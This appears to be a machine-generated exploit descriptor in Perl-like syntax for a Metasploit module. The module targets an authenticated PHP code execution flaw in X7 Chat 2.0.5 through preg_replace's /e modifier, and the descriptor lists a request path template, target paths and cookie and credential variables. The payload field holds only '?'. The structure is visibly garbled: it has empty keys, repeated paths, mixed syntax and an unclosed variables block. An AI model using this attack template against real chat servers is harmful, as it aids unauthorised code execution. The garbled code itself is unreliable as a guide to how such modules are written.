my $EXPLOIT = {
  DESCRIPTION => "\n\n        This module exploits a post-auth vulnerability found in X7 Chat versions\n\n        2.0.0 up to 2.0.5.1. The vulnerable code exists on lib/message.php, which\n\n        uses preg_replace() function with the /e modifier. This allows a remote\n\n        authenticated attacker to execute arbitrary PHP code in the remote machine.\n\n      ",
  METHOD      => "GET",
  MSF_MODULE  => "x7chat2_php_exec",
  PATH        => "act=__ACT__&cp_page=msgcenter&delete=__DELETE__&=____&",
  PATHS       => ["index.php", "index.php", "index.php", "index.php", "x7chat2"],
  PAYLOAD     => "?",
  REFERENCES  => ["https://github.com/rapid7/metasploit-framework/pull/4076"],
  TITLE       => "X7 Chat 2.0.5 lib/message.php preg_replace() PHP Code Execution",
}
VARIABLES = {
	TO = { DESCRIPTION => "", VALUE => "" },
	READ = { DESCRIPTION => "", VALUE => "" },
	ACT = { DESCRIPTION => "", VALUE => "" },
	 COOKIE_X7C2P  = { DESCRIPTION => "", VALUE => "" },
	 COOKIE_X7C2U  = { DESCRIPTION => "", VALUE => "" },
	PATH = { DESCRIPTION => "Base x7 Chat directory path", VALUE => "/x7chat2" },
	 = { DESCRIPTION => "", VALUE => "" },
	DELETE = { DESCRIPTION => "", VALUE => "" },
	 RAND_TEXT  = { DESCRIPTION => "", VALUE => "" },
	USERNAME = { DESCRIPTION => "", VALUE => "" },
	PASSWORD = { DESCRIPTION => "Pasword to authenticate as", VALUE => "" },
	SUBJECT = { DESCRIPTION => "", VALUE => "" },
